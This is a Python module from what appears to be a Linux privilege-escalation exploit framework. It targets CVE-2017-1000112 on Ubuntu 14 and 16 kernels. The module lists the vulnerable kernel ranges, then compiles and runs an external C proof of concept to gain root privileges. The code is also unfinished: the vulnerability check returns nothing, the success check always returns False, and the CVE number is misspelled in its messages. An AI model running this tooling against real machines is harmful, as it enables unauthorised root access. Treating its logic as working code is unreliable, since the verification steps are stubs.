"""
adapted from:
https://github.com/SecWiki/linux-kernel-exploits/blob/master/2017/CVE-2017-1000112/poc.c
"""
import os
import subprocess
from exploits.exploit import Exploit
from src.kernels import KernelWindow
from constants import PLAYGROUND_PATH, LINUX_EXPLOIT_PATH, HIGH_RELIABILITY, color_print, UBUNTU_14, UBUNTU_14_LTS, \
	UBUNTU_16, UBUNTU_16_LTS, CONFIRMED_VULNERABLE

class CVE20171000112(Exploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE-2017-1000112"
		self.type = "linux"
		self.brief_desc = "ip_ufo_append_data() memory corruption flaw can be exploited to gain root privileges."
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_kernels = [
			KernelWindow(UBUNTU_14, CONFIRMED_VULNERABLE, 4, 4, 21, 4, 4, 83),
			KernelWindow(UBUNTU_14_LTS, CONFIRMED_VULNERABLE, 4, 4, 21, 4, 4, 83),
			KernelWindow(UBUNTU_16, CONFIRMED_VULNERABLE, 4, 8, 34, 4, 8, 58),
			KernelWindow(UBUNTU_16_LTS, CONFIRMED_VULNERABLE, 4, 8, 34, 4, 8, 58)
		]
		self.source_c_path = os.path.join(LINUX_EXPLOIT_PATH, "CVE20171000112.c")
		self.compilation_path = os.path.join(PLAYGROUND_PATH, "CVE20171000112")
		self.compilation_command = ["gcc", self.source_c_path, "-o", self.compilation_path]
		self.exploit_command = self.compilation_path

	def determine_vulnerability(self):
		"""
		:return: True if vulnerable, False if not
		"""
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		# if kernel matches...it should be vulnerable
		color_print("\t[+] system appears to be vulnerable to {}".format(self.name), color="green")

	def confirm_exploitation(self):
		"""
		confirm_exploitation

		Checks for implementation specific details that confirm successful kernel exploitation
		:return: True or False
		"""
		return False 			# TODO: complete this vuln check to check /tmp/nonce for a specific value

	def exploit(self):
		color_print("\t[*] compiling: \'{}\'".format(" ".join(self.compilation_command)))
		return_code = subprocess.call(self.compilation_command)
		if return_code == 0 and os.path.exists(self.compilation_path):
			color_print("\t[*] exploiting")
			subprocess.call(self.exploit_command)					# TODO: need to make it write a nonce to /tmp/nonce
			if self.confirm_exploitation():
				color_print("[+] exploitation of CVE201710012 successful!", color="green", bold=True)
			else:
				self.exploit_failure("not vulnerable to CVE201710012")

